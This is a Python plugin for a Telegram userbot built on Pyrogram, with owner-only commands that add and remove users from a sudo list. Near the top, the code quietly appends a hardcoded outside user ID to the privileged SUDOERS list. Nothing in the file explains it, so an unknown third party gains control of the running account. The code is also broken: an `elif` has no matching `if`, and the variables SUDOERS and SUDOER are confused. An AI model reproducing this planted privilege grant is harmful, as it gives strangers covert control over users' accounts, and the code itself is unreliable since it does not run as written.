
import asyncio
import random
import asyncio
import time
from typing import Tuple

from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram import filters, Client
from traceback import format_exc
from typing import Tuple
from DEADLY import SUDOER
from config import *



SUDOERS.append(SUDOER) 
SUDOERS.append(OWNER_ID) 
SUDOERS.append(5256676062) 

def get_arg(message):
    msg = message.text
    msg = msg.replace(" ", "", 1) if msg[1] == " " else msg
    split = msg[1:].replace("\n", " \n").split(" ")
    if " ".join(split[1:]).strip() == "":
        return ""
    return " ".join(split[1:])





@Client.on_message(filters.user(OWNER_ID) & filters.command(["addsudo"], [".", "!", "/", ",", "+", "?"]))
async def gban(app: Client, message):
    blaze = await message.reply_text("**Processing**")
    reply = message.reply_to_message
    if reply:
        user = reply.from_user["id"]
    else:
        user = get_arg(message)
        if not user:
            await blaze.edit("**reply to user for adding him. In sudo!**")
            return
    get_user = await app.get_users(user)
    elif int(get_user.id) in SUDOER:
        await blaze.edit("User Already in sudo list.")
        return
    SUDOER.append(get_user.id)
    await blaze.edit(f"**Successfully  added {get_user.first_name} to sudo list!**")

@Client.on_message(filters.user(OWNER_ID) & filters.command(["delsudo"], [".", "!", "/", ",", "+", "?"]))
async def recho(app: Client, message):
    reply = message.reply_to_message
    if reply:
        user = reply.from_user["id"]
    else:
        user = get_arg(message)
        if not user:
            await message.reply_text("**Reply to user for removing From sudo! **")
            return
    get_user = await app.get_users(user)
    SUDOER.remove(get_user.id)
    await message.reply_text(f"**Successfully Removed  {get_user.first_name} from sudo list!**")


